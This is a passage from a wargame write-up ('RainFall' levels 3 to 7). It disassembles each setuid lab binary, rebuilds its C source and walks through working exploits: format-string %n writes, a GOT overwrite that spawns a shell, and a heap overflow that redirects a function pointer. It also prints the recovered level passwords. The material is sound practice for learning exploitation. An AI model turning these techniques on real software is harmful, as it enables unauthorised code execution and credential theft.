We can instead use multiple `%n` values with the address of each byte in the 4byte address integer

```bash
level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%10x%4$n' > /tmp/input

level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x0000001a in ?? ()

level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%10x%4$n''%10x%5$n' > /tmp/input

level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x0000241a in ?? ()
```

```bash
level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n' > /tmp/input
level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x000000e4 in ?? ()

# For the 2nd byte (0x84 / 132): add 132 to (256 - 228)

level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n''%160x%5$n' > /tmp/input

level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x000184e4 in ?? ()

# For the 3rd byte (0x04 / 4): add 4 to (256 - 132)

level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n''%160x%5$n''%127x%6$n' > /tmp/input
level3@RainFall:~$ gdb ./level3
...
(gdb) run </tmp/input
Starting program: /home/user/level3/level3 </tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x020384e4 in ?? ()

# For the 4th byte (0x08 / 8): add 4 to 256

level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%212x%4$n''%160x%5$n''%128x%6$n''%260x%7$n' > /tmp/input
level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input
\�]�^�_�                                                                                                                                                                                                                 200                                                                                                                                                        b7fd1ac0                                                                                                                        b7ff37d0                                                                                                                                                                                                                                                            bffff45cWait what?!
[Inferior 1 (process 28545) exited normally]
```

Yay! We hit the printf() call, but it didn't work, lets put directly the address before the system() call (`0x0804850c`)

```bash
level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf''\x5d\xf4\xff\xbf''\x5e\xf4\xff\xbf''\x5f\xf4\xff\xbf''%252x%4$n''%121x%5$n''%127x%6$n''%260x%7$n' > /tmp/input

level3@RainFall:~$ cat /tmp/input  | ./level3
\�]�^�_�                                                                                                                                                                                                                                                         200                                                                                                                 b7fd1ac0                                                                                                                       b7ff37d0                                                                                                                                                                                                                                                            bffff45c
```

Todo: redact this

## Level4

- [`objdump -d` output](http://...)

### ASM Interpretation

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080484a7 <+0>:	push   ebp
   0x080484a8 <+1>:	mov    ebp,esp
   0x080484aa <+3>:	and    esp,0xfffffff0
   0x080484ad <+6>:	call   0x8048457 <n> ; n()
   0x080484b2 <+11>:	leave
   0x080484b3 <+12>:	ret
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   0x08048457 <+0>:	push   ebp
   0x08048458 <+1>:	mov    ebp,esp
   0x0804845a <+3>:	sub    esp,0x218 ; Allocate 0x218 (536) bytes on the stack
   0x08048460 <+9>:	mov    eax,ds:0x8049804 ; exa to stdout@libc
   0x08048465 <+14>:	mov    DWORD PTR [esp+0x8],eax ; Set 3st argument of fgets() to stdout
   0x08048469 <+18>:	mov    DWORD PTR [esp+0x4],0x200 ; Set 2nd argument of fgets() to 512
   0x08048471 <+26>:	lea    eax,[ebp-0x208] ; Set 16th (520th last) byte of the stack to eax
   0x08048477 <+32>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of fgets()
   0x0804847a <+35>:	call   0x8048350 <fgets@plt> ; fgets(ebp[-0x208 / -520] / (16th last byte of the stack), 0x200 / 512, stdout);
   0x0804847f <+40>:	lea    eax,[ebp-0x208] ; Set eax to 16th (520th last) byte of the stack
   0x08048485 <+46>:	mov    DWORD PTR [esp],eax ; Set eax as argument of p()
   0x08048488 <+49>:	call   0x8048444 <p> ; Call p(eax) / p(&stack[16])
   0x0804848d <+54>:	mov    eax,ds:0x8049810 ; printf "%u", *0x8049810 -> "0" ; // unsigned int m = 0;
   0x08048492 <+59>:	cmp    eax,0x1025544 ; compare eax with 0x1025544 / 16930116 in decimal
   0x08048497 <+64>:	jne    0x80484a5 <n+78> ; if not equal, goto return of the function
   0x08048499 <+66>:	mov    DWORD PTR [esp],0x8048590 ; (gdb) printf "%s", 0x8048590 -> "/bin/cat /home/user/level5/.pass"
   0x080484a0 <+73>:	call   0x8048360 <system@plt> ; call system("/bin/cat /home/user/level5/.pass")
   0x080484a5 <+78>:	leave
   0x080484a6 <+79>:	ret

(gdb)disas p
Dump of assembler code for function p:
   0x08048444 <+0>:	push   ebp
   0x08048445 <+1>:	mov    ebp,esp
   0x08048447 <+3>:	sub    esp,0x18 ; Allocate 24 bytes on the stack
   0x0804844a <+6>:	mov    eax,DWORD PTR [ebp+0x8] ; Set eax to the first argument passed to p()
   0x0804844d <+9>:	mov    DWORD PTR [esp],eax ; Set eax to the 1st argument of printf()
   0x08048450 <+12>:	call   0x8048340 <printf@plt> ; call printf(eax)
   0x08048455 <+17>:	leave
   0x08048456 <+18>:	ret
End of assembler dump.
```

### Equivalent C source code

```c
#include <stdio.h>

unsigned int m = 0;

void	p(void *fmt) {
	printf(fmt);
}

void	n(void) {
	unsigned char buffer[536];

	fgets(&buffer[16], 512, stdout);
	p(&buffer[16]);
	if (m == 16930116) {
		system("/bin/cat /home/user/level5/.pass");
	}
}

int		main(int ac, char **av) {
    n();
}

```

### Walkthrough

```bash
level4@RainFall:~$ python -c 'print "%x "*50' > /tmp/lol

level4@RainFall:~$ gdb ./level4
(gdb) run < /tmp/lol
b7ff26b0 bffff6d4 b7fd0ff4 [0 0] bffff698 804848d bffff490 200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 ....

# We can think our m global variable is one of these two zeros

level4@RainFall:~$ echo -n -e '\x42\x42\x42\x42%4$s' >  /tmp/lol ; cat /tmp/lol | ./level4  | xxd
0000000: 4242 4242 286e 756c 6c29                 BBBB(null) # The program should segfault by reading the address 0x42424242 after printing BBBB


# Let's do a quick for to find the real offset of the string passed to p()
level4@RainFall:~$ (for i in $(seq 1 500); do echo -n "$i: "; echo -n -e "BBBB%$i\$x" | ./level4; echo; done;) | grep 42424242
12: BBBB42424242

# Try again ...
level4@RainFall:~$ echo -n -e '\x42\x42\x42\x42%12$s' >  /tmp/lol ; cat /tmp/lol | ./level4
Segmentation fault (core dumped)


level4@RainFall:~$ echo -n -e '\x10\x98\x04\x08%12$n' >  /tmp/lol ; cat /tmp/lol | ./level4  | xxd
0000000: 1098 0408                                ....

level4@RainFall:~$ gdb ./level4

(gdb) b *0x08048492
Breakpoint 1 at 0x8048492

(gdb) run < /tmp/lol
Starting program: /home/user/level4/level4 < /tmp/lol

Breakpoint 1, 0x08048492 in n ()
(gdb) printf "%u", *0x8049810
4

# The value of m got modified by the %n operator ! Now let's give it the value of the comparison (16930116) by printing 16930112 more characters
echo -n -e '\x10\x98\x04\x08%16930112x%12$n' >  /tmp/lol ; cat /tmp/lol - | ./level4
# Should print a lot of spaces .... and then
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## Level5

- [`objdump -d` output](http://ix.io/2cFu)

### ASM Interpretation

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   ebp
   0x08048505 <+1>:	mov    ebp,esp

   0x08048507 <+3>:	and    esp,0xfffffff0
   0x0804850a <+6>:	call   0x80484c2 <n> ; call n function

   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   ebp
   0x080484c3 <+1>:	mov    ebp,esp

   0x080484c5 <+3>:	sub    esp,0x218 ; Allocate 0x218 bytes on the stack (528)
   0x080484cb <+9>:	mov    eax,ds:0x8049848 ; Set eax to stdin@@GLIBC_2.0
   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax ; Set eax to 3rd argument of fgets()
   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200 ; Set 512 to 2nd argument of fgets()
   0x080484dc <+26>:	lea    eax,[ebp-0x208] ; Set eax to 520th byte of the stack
   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax ; Set eax as 1st argument of fgets()
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt> ; Call fgets(&buffer[16], 512, stdin); (512 + 16) > 528 so a buffer overflow is possible ...
     ;  char *fgets(char * restrict str, int size, FILE * restrict stream);
   0x080484ea <+40>:	lea    eax,[ebp-0x208] ; Set eax to 16th first byte of the stack
   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax ; Set eax to 1st argument of printf()
   0x080484f3 <+49>:	call   0x8048380 <printf@plt> ; Call printf(eax) / printf(&buffer[16])
     ; int printf(const char * restrict format, ...);
   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1 ; Set 1 as 1st argument of exit
   0x080484ff <+61>:	call   0x80483d0 <exit@plt> ; Call exit(1)
     ; void exit(int status);
End of assembler dump.

# If we look closely at the assembly code, we can find the o function, which is not called
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   ebp
   0x080484a5 <+1>:	mov    ebp,esp

   0x080484a7 <+3>:	sub    esp,0x18
   0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0 ; (gdb) printf "%s", 0x80485f0 -> "/bin/sh"
   0x080484b1 <+13>:	call   0x80483b0 <system@plt> ; Call system("/bin/sh");
   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1 ; Set 1 as 1st argument of exit
   0x080484bd <+25>:	call   0x8048390 <_exit@plt> ; Call exit(1)
End of assembler dump.
```

### Equivalent C source code

```c
#include <stdio.h>

void	o(void) {
	system("/bin/sh");
	exit(1);
}

void	n(void) {
	unsigned char buffer[528];
	
	fgets(&buffer[16], 512, stdin);
	printf(&buffer[16]);
	exit(1);
}

int		main(int ac, char **av) {
	n();
	return 0;
}

# Compiled with -fpic
```

### Walktrough

```bash
# Find the index of the string
level5@RainFall:~$ (for i in {1..500}; do echo -n -e 'BBBB%'${i}'$x' > /tmp/lol ; echo -n $i": "; cat /tmp/lol2 | ./level5 ; echo ; done;) | grep 42424242
4: BBBB42424242

# Check if we can make the program segfault
level5@RainFall:~$ echo 'BBBB%4$s' | ./level5
Segmentation fault (core dumped)
```

#### Finding saved EIP address

To find the saved EIP of the program, we can use the ability to make the program segfault in cordination with gdb

- Make the program SEGV:

```bash
(gdb) run <<< 'BBBB%4$x'
Starting program: /home/user/level5/level5 <<< 'BBBB%4$x'
BBBB42424242
[Inferior 1 (process 12790) exited with code 01]
(gdb) run <<< 'BBBB%4$s'
Starting program: /home/user/level5/level5 <<< 'BBBB%4$s'

Program received signal SIGSEGV, Segmentation fault.
0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
```

- Once the program has received the segv signal, check the backtrace of the program

```bash
(gdb) bt
#0  0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
#1  0xb7e7887f in printf () from /lib/i386-linux-gnu/libc.so.6
#2  0x080484f8 in n ()
#3  0x0804850f in main ()
```

- In our case, we want to modify the saved EIP of the n() function to avoid the exit() function call and instead jump into the o() function

- Use the `info frame` command with the index of the frame

```
(gdb) info  frame 1
Stack frame at 0xbffff480:
 eip = 0xb7e7887f in printf; saved eip 0x80484f8
 called by frame at 0xbffff6a0, caller of frame at 0xbffff460
 Arglist at 0xbffff460, args:
 Locals at 0xbffff460, Previous frame's sp is 0xbffff480
 Saved registers:
  ebx at 0xbffff478, eip at [0xbffff47c]

(gdb) info  frame 2
Stack frame at 0xbffff6a0:
 eip = 0x80484f8 in n; saved eip 0x804850f
 called by frame at 0xbffff6b0, caller of frame at 0xbffff480
 Arglist at 0xbffff698, args:
 Locals at 0xbffff698, Previous frame's sp is 0xbffff6a0
 Saved registers:
  ebp at 0xbffff698, [eip at 0xbffff69c]
```

- Try to overwrite the address of the saved EIP !

```bash
level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%4$s' | ./level5 | xxd
0000000: 7cf4 ffbf 7f88 e7b7 201a fdb7 b0f4 ffbf  |....... .......
0000010: a4f4 ffbf 5088 e7b7 b0f4 ffbf 18f9 ffb7  ....P...........
0000020: f40f fdb7 f884 0408 b0f4 ffbf            ............

level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%4$n' | ./level5
Segmentation fault (core dumped)

level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%4$n' > /tmp/lol

level5@RainFall:~$ gdb ./level5
(gdb) run < /tmp/lol
Starting program: /home/user/level5/level5 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()

level5@RainFall:~$ echo -n -e '\x7c\xf4\xff\xbf%134513824$n' > /tmp/lol # Address of o() minus 4 first printed bytes

(gdb) run < /tmp/lol
The program being debugged has been started already.
Start it from the beginning? (y or n) yy
Starting program: /home/user/level5/level5 < /tmp/lol
|�[Inferior 1 (process 3572) exited with code 01]

```

This didn't worked ... maybe another solution is possible ? 

### Overwriting exit from PLT

- [GOT and PLT for pwning.
](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html)

- [How to Hijack the Global Offset Table with pointers
](https://www.exploit-db.com/papers/13203)

```bash
level5@RainFall:~$ objdump  -R ./level5

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

- We can see that the address of the exit syscall is located at the address `08049838` of our PLT table

```bash
level5@RainFall:~$ objdump  -d ./level5
...
080483d0 <exit@plt>:
 80483d0:       ff 25 38 98 04 08       jmp    *0x8049838
 80483d6:       68 28 00 00 00          push   $0x28
 80483db:       e9 90 ff ff ff          jmp    8048370 <_init+0x3c>
...
```

```bash
(gdb) disas 0x8049838
Dump of assembler code for function exit@got.plt:
   0x08049838 <+0>:     (bad)
   0x08049839 <+1>:     add    DWORD PTR [eax+ecx*1],0xffffffe6
End of assembler dump.
```

- So when exit() is called, the function will jump to the address stored in this address, let's stry to overwrite it with the address of o()

```bash
level5@RainFall:~$ echo -n -e '\x38\x98\x04\x08%134513824x%4$n' > /tmp/lol

level5@RainFall:~$ cat /tmp/lol  - | ./level5
# Prints a lot of spaces
200ls
ls
ls: cannot open directory .: Permission denied
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Level6

- [`objdump -d` output](http://ix.io/2dwZ)

### ASM Interpretation

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   ebp ; ASM Prologue
   0x0804847d <+1>:     mov    ebp,esp ; ASM Prologue

   0x0804847f <+3>:     and    esp,0xfffffff0 ; Align esp
   0x08048482 <+6>:     sub    esp,0x20 ; Allocate 0x20 / 32 bytes on the stack
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40 ; Move 0x40 / 64 to first argument of malloc()
   0x0804848c <+16>:    call   0x8048350 <malloc@plt> ; Call malloc(64)
     ; void *malloc(size_t size);
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax ; Set the 28th byte of the stack to eax
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4 ; Set 0x4 / 4 as 1st argument of malloc()
   0x0804849c <+32>:    call   0x8048350 <malloc@plt> ; Call malloc(4)
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax ; Set the 24th byte of the stack to eax
   0x080484a5 <+41>:    mov    edx,0x8048468 ; Set edx to the address of m()
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18] ; Set eax to the 24th byte of the stack
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx ; Set eax to edx
   
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc] ; Set eax to 12 byte before the beginning of the stack
   0x080484b3 <+55>:    add    eax,0x4 ; Add 4 to eax
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax] ;
   0x080484b8 <+60>:    mov    edx,eax ; Set edx to eax
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c] ; Set eax to the 28th byte of the stack
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx ; Set the 2nd argument of strcpy() to edx
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax ; Set the 1st argument of strcpy to eax
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt> ; Call strcpy(eax, edx)
     ; char *strcpy(char * dst, const char * src);
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18] ; Set eax to the 24th byte of the stack
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:    call   eax ; Call eax()
   0x080484d2 <+86>:    leave ; ASM Epilogue
   0x080484d3 <+87>:    ret ; ASM Epilogue
End of assembler dump.

(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   ebp ; ASM Prologue
   0x08048469 <+1>:     mov    ebp,esp ; ASM Prologue
   0x0804846b <+3>:     sub    esp,0x18 ; Allocate 24 bytes on the stack
   0x0804846e <+6>:     mov    DWORD PTR [esp],0x80485d1 ; printf "%s", 0x80485d1 -> "Nope"; Set the 1st argument of puts() to "Nope"
   0x08048475 <+13>:    call   0x8048360 <puts@plt> ; Call puts("Nope");
   0x0804847a <+18>:    leave ; ASM Epilogue
   0x0804847b <+19>:    ret ; ASM Epilogue
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   ebp ; ASM Prologue
   0x08048455 <+1>:     mov    ebp,esp ; ASM Prologue
   0x08048457 <+3>:     sub    esp,0x18 ; Allocate 24 bytes on the stack
   0x0804845a <+6>:     mov    DWORD PTR [esp],0x80485b0 ; printf "%s", 0x80485b0 -> "/bin/cat /home/user/level7/.pass" ; Set the 1st argument of system() to "/bin/cat /home/user/level7/.pass"
   0x08048461 <+13>:    call   0x8048370 <system@plt> ; Call system("/bin/cat /home/user/level7/.pass")
   0x08048466 <+18>:    leave ; ASM Epilogue
   0x08048467 <+19>:    ret ; ASM Epilogue
End of assembler dump.
```

### Equivalent C source code


```c
#include <stdio.h>

void    n() {
        unsigned char buf[24];

        system("bin/cat /home/user/level7/.pass");
}

void    m() {
        unsigned char buf[24];

        puts("Nope");
}

int     main(int ac, char **av) {
        unsigned char   buf[32];

        (void *)(*(buf + 28)) = malloc(64);
        (void *)(*(buf + 24)) = malloc(4);
        (void *)(*(buf + 24)) = &m;
        strcpy((void *)(*(buf + 28)), av[1]);
        *(&buf[24])();
        return ;
}
```

### Walktrough

#### Malloc exploitation

- [Heap execution exploitation](https://www.win.tue.nl/~aeb/linux/hh/hh.html#toc11.1)

```bash
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)

level6@RainFall:~$ ./level6 a
Nope
```

- As we can see the program segfaults when no arguments are passed we can know it uses argv[1]

```bash
level6@RainFall:~$ ./level6  $(python -c 'print "A"*71')
Nope

level6@RainFall:~$ ./level6  $(python -c 'print "A"*72')
Segmentation fault (core dumped)

(gdb) run  $(python -c 'print "A"*72')
Starting program: /home/user/level6/level6 $(python -c 'print "A"*72')

Program received signal SIGSEGV, Segmentation fault.
0x08048408 in __do_global_dtors_aux ()
```

- As we can see the program segfault when we start to pass more than 71 bytes

In fact, what we're doing here is simple:

Malloc uses a structure to store our allocations informations, for an allocated chunk, we use 4 bytes, 3 for the size aligned to 8, and the last one for the status which tells if a chunk is free or not.

Even if we only use 4 bytes, the whole structure will take 8 bytes to be sure to align correctly with memory pages.

![](https://www.win.tue.nl/~aeb/linux/hh/malloc.png)

So in our case we write a total of 76 bytes:

- 64 for our first malloc() call

- 4 to overwrite the chunk informations

- 4 other to overwrite the rest of the malloc structure needed for alignement

- 4 to fill the 2nd malloc() call, which is executed

```bash
(gdb) run $(python -c 'print "A"*76')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level6/level6 $(python -c 'print "A"*76')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
---

level6@RainFall:~$ gdb ./level6
gdb$ run $(python -c 'print "A"*72+"B"*4')
Starting program: /home/user/level6/level6 $(python -c 'print "A"*72+"B"*4')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

- Let's try with the address of n() instead (`0x08048454`)

```

level6@RainFall:~$ ./level6  $(python -c 'print "A"*72')$(echo -n -e '\x54\x84\x04\x08')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

## Level7

- [`objdump -d` output](http://ix.io/2dxJ)

### ASM Interpretation

```asm
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048521 <+0>:     push   ebp ; ASM Prologue
   0x08048522 <+1>:     mov    ebp,esp ; ASM Prologue

   0x08048524 <+3>:     and    esp,0xfffffff0 ; Align esp
   0x08048527 <+6>:     sub    esp,0x20 ; Allocate 32 bytes on the stack

   0x0804852a <+9>:     mov    DWORD PTR [esp],0x8 ; Set 8 to the 1st argument of malloc()
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt> ; Call malloc(8);
   0x08048536 <+21>:    mov    DWORD PTR [esp+0x1c],eax ; Set 28th byte of the stack to eax (return of malloc)
   0x0804853a <+25>:    mov    eax,DWORD PTR [esp+0x1c] ; Set eax to the 28th byte of the stack
   0x0804853e <+29>:    mov    DWORD PTR [eax],0x1 ; Set the value pointed by eax to 1

   0x08048544 <+35>:    mov    DWORD PTR [esp],0x8 ; Set 1st argument of malloc() to 8
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt> ; Call malloc(8);
   0x08048550 <+47>:    mov    edx,eax ; Set edx to eax (return of malloc)
   0x08048552 <+49>:    mov    eax,DWORD PTR [esp+0x1c] ; Set eax to 28th byte of the stack
   0x08048556 <+53>:    mov    DWORD PTR [eax+0x4],edx ; Set the 4th to 8th byte of the allocation stored in the 28th to edx

   0x08048559 <+56>:    mov    DWORD PTR [esp],0x8 ; Set the 1st argument of malloc to 8
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt> ; Call malloc(8)
   0x08048565 <+68>:    mov    DWORD PTR [esp+0x18],eax ; Set the 24th byte of the stack to the return of malloc()
   0x08048569 <+72>:    mov    eax,DWORD PTR [esp+0x18] ; Set eax to the 24th byte of the stack
   0x0804856d <+76>:    mov    DWORD PTR [eax],0x2 ; Set the value of the first 4 bytes stored in eax to 2

   0x08048573 <+82>:    mov    DWORD PTR [esp],0x8 ; Set 8 as the first argument of malloc
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt> ; Call malloc(8)
   0x0804857f <+94>:    mov    edx,eax ; Set the return of malloc to edx
   0x08048581 <+96>:    mov    eax,DWORD PTR [esp+0x18] ; Set eax to the 24th byte of the stack
   0x08048585 <+100>:   mov    DWORD PTR [eax+0x4],edx ; Set the 4th to 7th byte of the address stored in eax to the return of malloc store in edx

   0x08048588 <+103>:   mov    eax,DWORD PTR [ebp+0xc] ; Set eax to the 2nd argument of main() / av
   0x0804858b <+106>:   add    eax,0x4 ; add 4 to the address pointed by eax (av[1])
   0x0804858e <+109>:   mov    eax,DWORD PTR [eax] ; set eax to the value pointed by it
   0x08048590 <+111>:   mov    edx,eax ; Set edx to eax
   0x08048592 <+113>:   mov    eax,DWORD PTR [esp+0x1c] ; Set eax to the 28th byte of the stack
   0x08048596 <+117>:   mov    eax,DWORD PTR [eax+0x4] ; Set eax to the value pointed by it + 4

   0x08048599 <+120>:   mov    DWORD PTR [esp+0x4],edx ; Set the 2nd argument of strcpy to edx
   0x0804859d <+124>:   mov    DWORD PTR [esp],eax ; Set the 1st argument of strcpy to eax
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt> ; Call strcpy(eax, edx)
   0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc] ; Set eax to av
   0x080485a8 <+135>:   add    eax,0x8 ; Add 8 to eax (av[2])
   0x080485ab <+138>:   mov    eax,DWORD PTR [eax] ; Set eax to the value stored in it
   0x080485ad <+140>:   mov    edx,eax ; Move eax to edx
   0x080485af <+142>:   mov    eax,DWORD PTR [esp+0x18] ; Set eax to 24th byte of the stack
   0x080485b3 <+146>:   mov    eax,DWORD PTR [eax+0x4] ; Set eax to the value stored in eax + 4

   0x080485b6 <+149>:   mov    DWORD PTR [esp+0x4],edx ; Set edx as the 2nd argument of strcpy
   0x080485ba <+153>:   mov    DWORD PTR [esp],eax ; Set eax as the 1st argument of strcpy
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt> ; Call strcpy(eax, edx);
   0x080485c2 <+161>:   mov    edx,0x80486e9 ; printf "%s", 0x80486e9 -> "r"
   0x080485c7 <+166>:   mov    eax, ; printf "%s", 0x80486eb -> "/home/user/level8/.pass"

   0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx ; Set edx to the 2nd argument of fopen()
   0x080485d0 <+175>:   mov    DWORD PTR [esp],eax ; Set eax to the 1st argument of fopen()
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt> ; Call fopen("/home/user/level8/.pass", "r");
     ; FILE *fopen(const char * restrict path, const char * restrict mode);

   0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax ; Set eax as 3rd argument of fgets()
   0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44 ; Set 68 as 2nd argument of fgets()
   0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960 ; printf "%s", 0x8049960 -> "" ; x/c 0x8049960 -> "0x8049960 <c>:  0x0"
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt> ; Call fgets("", 68, eax);
     ; char *fgets(char * restrict str, int size, FILE * restrict stream);

   0x080485f0 <+207>:   mov    DWORD PTR [esp],0x8048703 ; printf "%s", 0x8048703 -> "~~"
   0x080485f7 <+214>:   call   0x8048400 <puts@plt> ; Call puts("~~")
     ; int puts(const char *s);
   0x080485fc <+219>:   mov    eax,0x0 ; Set 0 as return value of main()

   0x08048601 <+224>:   leave ; ASM Epilogue
   0x08048602 <+225>:   ret ; ASM Epilogue
End of assembler dump.

gdb-peda$ disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   ebp ; ASM Prologue
   0x080484f5 <+1>:     mov    ebp,esp ; ASM Prologue

   0x080484f7 <+3>:     sub    esp,0x18 ; Allocate 24 bytes on the stack
   0x080484fa <+6>:     mov    DWORD PTR [esp],0x0 ; Set 0 as the first argument of time()
   0x08048501 <+13>:    call   0x80483d0 <time@plt> ; Call time(0)
     ; time_t time(time_t *tloc);
   0x08048506 <+18>:    mov    edx,0x80486e0 ; printf "%s", 0x80486e0 -> "%s - %d" ; Set edx to "%s - %d"
   0x0804850b <+23>:    mov    DWORD PTR [esp+0x8],eax ; Set 3rd argument of printf() to eax
   0x0804850f <+27>:    mov    DWORD PTR [esp+0x4],0x8049960 ; printf "%d", *0x8049960 -> "0" ; Set 2nd argument of printf to 0
   0x08048517 <+35>:    mov    DWORD PTR [esp],edx ; Set edx to 1st argument of printf
   0x0804851a <+38>:    call   0x80483b0 <printf@plt> ; Call printf("%s - %d", 0, eax);
     ; int printf(const char * restrict format, ...);

   0x0804851f <+43>:    leave ; ASM Epilogue
   0x08048520 <+44>:    ret ; ASM Epilogue
End of assembler dump.
```

### Equivalent C source code

```c
void    m(void) {
        unsigned char   align[24];

        printf("%s - %d", 0x8049960, time(NULL));
        return ;
}

int             main() {
        uintptr_t       *s1;
        uintptr_t       *s2;
        unsigned char   align[24];

        s1 = malloc(8);
        s1[0] = 1;
        
        s1[1] = malloc(8);
        
        s2 = malloc(8);
        s2[0] = 2;
        
        s2[1] = malloc(8);
        
        strcpy(s1[1], av[1]);

        strcpy(s2[1], av[2]);

        fgets(0x8049960, 68, fopen("/home/user/level8/.pass", "r"));

        puts("~~");

        return (0);
}
```

### Walktrough

```bash
level7@RainFall:~$ ./level7
Segmentation fault (core dumped)

level7@RainFall:~$ ./level7 a
Segmentation fault (core dumped)

level7@RainFall:~$ ./level7 $(python -c 'print "A"*72')
Segmentation fault (core dumped)

level7@RainFall:~$ ./level7 $(python -c 'print "A"*500')
Segmentation fault (core dumped)

level7@RainFall:~$ ./level7  a a
~~

level7@RainFall:~$ ./level7  a a a
~~

level7@RainFall:~$ ./level7  a b
~~

level7@RainFall:~$ ./level7  $(python -c 'print "A"*20') $(python -c 'print "A"*20')
~~

level7@RainFall:~$ ./level7  $(python -c 'print "A"*21') $(python -c 'print "A"*20')
